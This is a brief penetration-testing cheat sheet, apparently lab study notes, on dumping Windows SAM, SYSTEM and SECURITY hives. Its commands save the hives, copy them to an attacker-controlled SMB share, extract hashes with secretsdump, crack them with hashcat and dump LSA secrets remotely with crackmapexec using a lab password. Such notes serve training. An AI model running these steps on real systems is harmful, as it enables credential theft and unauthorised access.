#windows/auth/SAM
SAM (Security Account Manager) is a database file in Windows operating systems that stores local user accounts and security descriptors for users on the local machine. It is a critical component of the Windows security system and is located in the `C:\Windows\System32\config` directory.

The LSA is a core component of Windows security, responsible for authentication, authorization, and enforcing security policies. It operates within the LSASS.exe process and is critical for maintaining the integrity and security of the system.

#### SAM Hives:
* `hklm\sam` 	        Contains the hashes associated with local account passwords
* `hklm\system` 	Contains the system bootkey, which is used to encrypt the SAM database.
* `hklm\security` 	Contains cached credentials for domain accounts. 

Saving:
```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

##### Create a smb share to copy saved hives to attack machines:
```shell
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```
##### Copy:
```cmd
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
```
##### Dump hashes:
```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
##### Crack nthashes:
```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

##### Dumping LSA Secrets Remotely:
```shell
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
##### Dumping SAM Remotely:
```shell
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```